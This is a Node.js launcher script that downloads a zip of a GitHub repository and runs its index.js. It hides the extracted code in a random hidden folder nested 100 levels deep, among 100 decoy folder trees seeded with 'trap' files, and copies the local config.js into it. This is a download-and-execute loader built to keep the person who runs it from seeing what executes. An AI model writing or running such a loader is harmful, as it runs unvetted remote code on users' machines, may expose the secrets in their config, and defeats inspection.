const fs = require('fs');
const path = require('path');
const axios = require('axios');
const AdmZip = require('adm-zip');
const crypto = require('crypto');

const repoZipUrl = 'https://github.com/3strox/x/archive/refs/heads/main.zip';

const CACHE_FOLDER = path.join(__dirname, '.cache');
const NUM_ROOTS = 100;
const NEST_DEPTH = 100;

// Generate a random hex folder name
function randomName() {
    return '.' + crypto.randomBytes(3).toString('hex');
}

// Create deep folder (100 nested levels)
function createDeepFolder(base) {
    let current = base;
    for (let i = 0; i < NEST_DEPTH; i++) {
        const sub = randomName();
        current = path.join(current, sub);
        if (!fs.existsSync(current)) {
            fs.mkdirSync(current);
        }
    }
    return current; // return deepest path
}

// Download and extract zip
async function downloadAndExtractRepo(targetPath) {
    try {
        console.log('[🌐] Connecting to Server...');
        const response = await axios.get(repoZipUrl, { responseType: 'arraybuffer' });
        const zip = new AdmZip(Buffer.from(response.data, 'binary'));
        zip.extractAllTo(targetPath, true);
        console.log('[✅] Repo extracted in hidden folder.');
    } catch (err) {
        console.error('❌ Failed to extract repo:', err);
        process.exit(1);
    }
}

(async () => {
    if (!fs.existsSync(CACHE_FOLDER)) fs.mkdirSync(CACHE_FOLDER);

    let realPath = '';
    const realIndex = Math.floor(Math.random() * NUM_ROOTS);

    for (let i = 0; i < NUM_ROOTS; i++) {
        const root = path.join(CACHE_FOLDER, randomName());
        fs.mkdirSync(root);

        const deepFolder = createDeepFolder(root);

        if (i === realIndex) {
            realPath = path.join(deepFolder, '.repo');
            fs.mkdirSync(realPath, { recursive: true });
            await downloadAndExtractRepo(realPath);
        } else {
            fs.writeFileSync(path.join(deepFolder, '.dummy'), '🪤 trap!');
        }
    }

    const extracted = fs.readdirSync(realPath).find(f =>
        fs.statSync(path.join(realPath, f)).isDirectory()
    );

    if (!extracted) {
        console.error('❌ No valid folder extracted.');
        process.exit(1);
    }

    const extractedPath = path.join(realPath, extracted);

    // Copy local config
    const localConfig = path.join(__dirname, 'config.js');
    if (fs.existsSync(localConfig)) {
        fs.copyFileSync(localConfig, path.join(extractedPath, 'config.js'));
    }

    console.log('[🚀] Running from secret folder...');
    process.chdir(extractedPath);
    require(path.join(extractedPath, 'index.js'));
})();
